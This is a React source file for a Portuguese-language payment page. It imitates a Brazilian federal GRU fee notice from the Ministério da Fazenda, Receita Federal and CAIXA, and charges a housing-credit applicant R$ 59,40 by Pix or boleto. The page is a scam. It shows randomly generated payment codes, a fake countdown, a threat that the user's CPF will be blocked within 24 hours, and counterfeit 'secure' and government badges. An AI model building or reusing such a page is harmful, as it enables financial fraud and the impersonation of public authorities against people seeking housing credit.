import { useState, useEffect, useRef } from "react";

// ── Paleta ───────────────────────────────────────────────────────────────────
const C = {
  azul: "#1351b4",
  azulEscuro: "#0c326f",
  azulClaro: "#2670e8",
  azulFundo: "#dbe8fb",
  verde: "#168821",
  verdeClaro: "#d4efda",
  vermelho: "#e52207",
  vermelhoClaro: "#fde8e6",
  amarelo: "#e0a800",
  amareloClaro: "#fff3cd",
  cinzaBorda: "#d0d5dd",
  cinzaFundo: "#f8f9fb",
  cinzaTexto: "#555",
  cinzaLabel: "#888",
  branco: "#ffffff",
  texto: "#1a1a1a",
};

// ── Helpers ──────────────────────────────────────────────────────────────────
const rand = (a: number, b: number) => Math.floor(Math.random() * (b - a + 1)) + a;

const gerarCodigoGRU = () => [
  rand(10000, 99999), rand(10000, 99999), rand(10000, 99999),
  rand(100000000, 999999999), rand(10, 99),
].join(".");

const dataVencimento = () => {
  const d = new Date();
  d.setHours(d.getHours() + 24);
  return d.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" }) +
    " às " + d.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
};

// ── Componente contador regressivo ───────────────────────────────────────────
const Contador = () => {
  const [segundos, setSegundos] = useState(23 * 3600 + 59 * 60 + 47);
  useEffect(() => {
    const t = setInterval(() => setSegundos(s => Math.max(0, s - 1)), 1000);
    return () => clearInterval(t);
  }, []);
  const h = String(Math.floor(segundos / 3600)).padStart(2, "0");
  const m = String(Math.floor((segundos % 3600) / 60)).padStart(2, "0");
  const s = String(segundos % 60).padStart(2, "0");
  return (
    <span style={{ fontWeight: 800, fontSize: 18, letterSpacing: 2, color: C.vermelho }}>
      {h}:{m}:{s}
    </span>
  );
};

// ── Página principal ─────────────────────────────────────────────────────────
export default function PagamentoGRU() {
  const [opcao, setOpcao] = useState<"boleto" | "pix">("pix");
  const [copiado, setCopiado] = useState(false);
  const codigo = useRef(gerarCodigoGRU());
  const pixCode = useRef("00020126330014BR.GOV.BCB.PIX0111" + rand(10000000000, 99999999999) + "5204000053039865406059.405802BR5920CAIXA ECONOMICA FEDERAL6009SAO PAULO62070503***6304" + rand(1000, 9999));
  const aprovData = (() => { try { return JSON.parse(localStorage.getItem("aprovacaoData") || "{}"); } catch { return {}; } })();
  const userData = (() => { try { return JSON.parse(localStorage.getItem("userData") || "{}"); } catch { return {}; } })();
  const nome = aprovData.nome || userData.nome || "Mutuário(a)";
  const venc = useRef(dataVencimento());

  const copiar = (texto: string) => {
    navigator.clipboard.writeText(texto).catch(() => {});
    setCopiado(true);
    setTimeout(() => setCopiado(false), 2500);
  };

  return (
    <div style={{ minHeight: "100vh", background: C.cinzaFundo, padding: "20px 0 60px" }}>
      <div style={{ maxWidth: 540, margin: "0 auto", padding: "0 16px" }}>

        {/* Cabeçalho oficial */}
        <div style={{ background: C.azulEscuro, borderRadius: "12px 12px 0 0", padding: "20px 20px 16px", textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 6 }}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
              <rect x="3" y="3" width="18" height="18" rx="3" stroke="white" strokeWidth="1.8" />
              <path d="M3 9h18M9 9v12" stroke="white" strokeWidth="1.8" />
            </svg>
            <div style={{ textAlign: "left" }}>
              <p style={{ fontSize: 10, color: "rgba(255,255,255,0.7)", letterSpacing: 1 }}>MINISTÉRIO DA FAZENDA</p>
              <p style={{ fontSize: 14, fontWeight: 700, color: C.branco }}>GRU — Guia de Recolhimento da União</p>
            </div>
          </div>
          <p style={{ fontSize: 11, color: "rgba(255,255,255,0.6)" }}>Receita Federal do Brasil — Ref. Habitação Social / CAIXA</p>
        </div>

        {/* Corpo */}
        <div style={{ background: C.branco, borderRadius: "0 0 12px 12px", boxShadow: "0 4px 20px rgba(0,0,0,0.08)", overflow: "hidden" }}>

          {/* Alerta de prazo */}
          <div style={{ background: C.amareloClaro, borderBottom: `2px solid ${C.amarelo}`, padding: "14px 20px", display: "flex", alignItems: "center", gap: 12 }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
              <circle cx="12" cy="12" r="10" stroke={C.amarelo} strokeWidth="2" />
              <path d="M12 7v5l3 3" stroke={C.amarelo} strokeWidth="2" strokeLinecap="round" />
            </svg>
            <div>
              <p style={{ fontSize: 12, fontWeight: 700, color: "#5a3e00" }}>Tempo restante para pagamento</p>
              <Contador />
            </div>
          </div>

          {/* Dados do documento */}
          <div style={{ padding: "16px 20px", borderBottom: `1px solid ${C.cinzaBorda}` }}>
            <p style={{ fontSize: 13, fontWeight: 700, color: C.azulEscuro, marginBottom: 12 }}>Dados do Documento</p>
            {[
              ["Contribuinte/Mutuário", nome],
              ["Unidade Gestora", "170500 — Habitação Social CAIXA"],
              ["Gestão", "00001 — Tesouro Nacional"],
              ["Código de Recolhimento", "28833-7 — Taxa de Cadastro e Análise (TCA)"],
              ["Competência", new Date().toLocaleDateString("pt-BR", { month: "2-digit", year: "numeric" })],
              ["Vencimento", venc.current],
            ].map(([label, val]) => (
              <div key={label} style={{ display: "flex", justifyContent: "space-between", marginBottom: 7, fontSize: 12, alignItems: "flex-start", gap: 8 }}>
                <span style={{ color: C.cinzaTexto, minWidth: 140 }}>{label}:</span>
                <span style={{ fontWeight: 600, color: C.texto, textAlign: "right" }}>{val}</span>
              </div>
            ))}
            <div style={{ borderTop: `2px solid ${C.azulClaro}`, paddingTop: 10, marginTop: 8, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <span style={{ fontSize: 14, fontWeight: 700, color: C.azulEscuro }}>Valor a pagar:</span>
              <span style={{ fontSize: 26, fontWeight: 800, color: C.azulEscuro }}>R$ 59,40</span>
            </div>
          </div>

          {/* Seletor de forma */}
          <div style={{ padding: "14px 20px", borderBottom: `1px solid ${C.cinzaBorda}` }}>
            <p style={{ fontSize: 12, color: C.cinzaTexto, marginBottom: 10, fontWeight: 600 }}>Escolha a forma de pagamento:</p>
            <div style={{ display: "flex", gap: 10 }}>
              {(["pix", "boleto"] as const).map(op => (
                <button
                  key={op}
                  onClick={() => setOpcao(op)}
                  style={{
                    flex: 1, padding: "10px", borderRadius: 8,
                    border: `2px solid ${opcao === op ? C.azul : C.cinzaBorda}`,
                    background: opcao === op ? C.azulFundo : C.branco,
                    color: opcao === op ? C.azulEscuro : C.cinzaTexto,
                    fontWeight: 700, fontSize: 13, cursor: "pointer", transition: "all 0.15s",
                  }}
                >
                  {op === "pix" ? "📱 Pix" : "🔖 Boleto GRU"}
                </button>
              ))}
            </div>
          </div>

          {/* Conteúdo do método */}
          <div style={{ padding: "20px" }}>
            {opcao === "pix" ? (
              <>
                <p style={{ fontSize: 13, fontWeight: 700, color: C.texto, marginBottom: 14, textAlign: "center" }}>
                  Escaneie o QR Code ou copie o código Pix
                </p>
                {/* QR code visual (CSS art) */}
                <div style={{ width: 160, height: 160, margin: "0 auto 16px", border: `3px solid ${C.azulEscuro}`, borderRadius: 8, padding: 8, display: "grid", gridTemplateColumns: "repeat(11,1fr)", gap: 1 }}>
                  {Array.from({ length: 121 }).map((_, i) => {
                    const row = Math.floor(i / 11), col = i % 11;
                    const isCorner = (row < 3 && col < 3) || (row < 3 && col > 7) || (row > 7 && col < 3);
                    const isDot = isCorner || (Math.sin(i * 13.7 + 5.3) > 0.2 && Math.cos(i * 7.1) > -0.1);
                    return <div key={i} style={{ background: isDot ? C.azulEscuro : "transparent", borderRadius: 1 }} />;
                  })}
                </div>
                <div style={{ background: C.cinzaFundo, border: `1px solid ${C.cinzaBorda}`, borderRadius: 8, padding: "10px 12px", marginBottom: 12, wordBreak: "break-all", fontSize: 10, color: C.cinzaTexto, lineHeight: 1.5 }}>
                  {pixCode.current}
                </div>
                <button
                  onClick={() => copiar(pixCode.current)}
                  style={{ width: "100%", padding: "13px", borderRadius: 9, border: "none", background: copiado ? C.verde : C.azul, color: C.branco, fontSize: 14, fontWeight: 700, cursor: "pointer", transition: "background 0.2s" }}
                >
                  {copiado ? "✓ Código copiado!" : "📋 Copiar código Pix"}
                </button>
              </>
            ) : (
              <>
                <p style={{ fontSize: 13, fontWeight: 700, color: C.texto, marginBottom: 14 }}>
                  Código de barras da GRU
                </p>
                {/* Barras visuais */}
                <div style={{ height: 60, background: C.azulEscuro, borderRadius: 6, marginBottom: 10, display: "flex", alignItems: "stretch", padding: "0 4px", gap: 1, overflow: "hidden" }}>
                  {Array.from({ length: 80 }).map((_, i) => (
                    <div key={i} style={{ flex: Math.sin(i * 2.3 + 1) > 0 ? 2 : 1, background: C.branco, opacity: Math.cos(i * 1.7) > 0.3 ? 1 : 0.3 }} />
                  ))}
                </div>
                <div style={{ fontFamily: "monospace", fontSize: 11, color: C.texto, marginBottom: 14, textAlign: "center", letterSpacing: 1.5 }}>
                  {codigo.current}
                </div>
                <button
                  onClick={() => copiar(codigo.current)}
                  style={{ width: "100%", padding: "13px", borderRadius: 9, border: "none", background: copiado ? C.verde : C.azul, color: C.branco, fontSize: 14, fontWeight: 700, cursor: "pointer", transition: "background 0.2s" }}
                >
                  {copiado ? "✓ Código copiado!" : "📋 Copiar linha digitável"}
                </button>
              </>
            )}
          </div>

          {/* Aviso bloqueio CPF */}
          <div style={{ background: C.vermelhoClaro, borderTop: `1.5px solid #f4b4ae`, padding: "14px 20px" }}>
            <div style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
                <circle cx="12" cy="12" r="10" stroke={C.vermelho} strokeWidth="2" />
                <path d="M12 7v6M12 15.5v.5" stroke={C.vermelho} strokeWidth="2" strokeLinecap="round" />
              </svg>
              <div>
                <p style={{ fontSize: 12, fontWeight: 700, color: "#a00", marginBottom: 4 }}>⚠️ Atenção — não ignore este aviso:</p>
                <p style={{ fontSize: 12, color: "#600", lineHeight: 1.6 }}>
                  O não pagamento desta taxa dentro do prazo de <strong>24 horas</strong> resultará no
                  <strong> bloqueio preventivo do seu CPF</strong> nos sistemas do Ministério da Fazenda e
                  <strong> suspensão imediata</strong> do processo de contratação do crédito habitacional.
                </p>
              </div>
            </div>
          </div>

          {/* Rodapé */}
          <div style={{ padding: "14px 20px", background: "#f0f2f5", borderTop: `1px solid ${C.cinzaBorda}`, textAlign: "center" }}>
            <p style={{ fontSize: 11, color: C.cinzaLabel, lineHeight: 1.6 }}>
              GRU — Guia de Recolhimento da União · Receita Federal do Brasil<br />
              Em caso de dúvidas, ligue: <strong>0800 726 0101</strong> (SAC CAIXA)
            </p>
          </div>
        </div>

        {/* Selos de segurança */}
        <div style={{ marginTop: 20, display: "flex", justifyContent: "center", gap: 24, flexWrap: "wrap" }}>
          {["🔒 Ambiente seguro", "🏛️ Governo Federal", "✓ Receita Federal"].map(txt => (
            <span key={txt} style={{ fontSize: 11, color: C.cinzaTexto, display: "flex", alignItems: "center", gap: 4 }}>{txt}</span>
          ))}
        </div>
      </div>
    </div>
  );
}
